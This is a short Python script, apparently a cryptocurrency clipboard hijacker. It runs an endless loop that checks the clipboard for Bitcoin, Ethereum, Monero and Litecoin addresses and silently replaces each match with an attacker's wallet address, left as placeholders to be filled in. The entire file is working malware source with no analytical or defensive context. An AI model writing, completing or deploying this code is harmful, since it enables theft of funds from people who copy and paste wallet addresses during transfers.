import pyperclip as pc
import time, re

BTC_address = "BTC_WALLET_HERE"
ETH_address = "ETH_WALLET_HERE"
MON_address  = "MONERO_WALLET_HERE"
LTC_address = "LTC_WALLET_HERE"


while True:
    s = str(pc.paste())
    btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", s)
    btc_match = bool(btc_check)
    eth_check = re.match("^0x[a-zA-F0-9]{40}$", s)
    eth_match = bool(eth_check)
    mon_check = re.match("^4([0-9]|[A-B])(.){93}$", s)
    mon_match = bool(mon_check)
    ltc_check = re.match("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", s)
    ltc_match = bool(ltc_check)
    time.sleep(0.25)
    if btc_match == True: pc.copy(BTC_address)
    elif eth_match == True: pc.copy(ETH_address)
    elif mon_match == True: pc.copy(MON_address)
    elif ltc_match == True: pc.copy(LTC_address)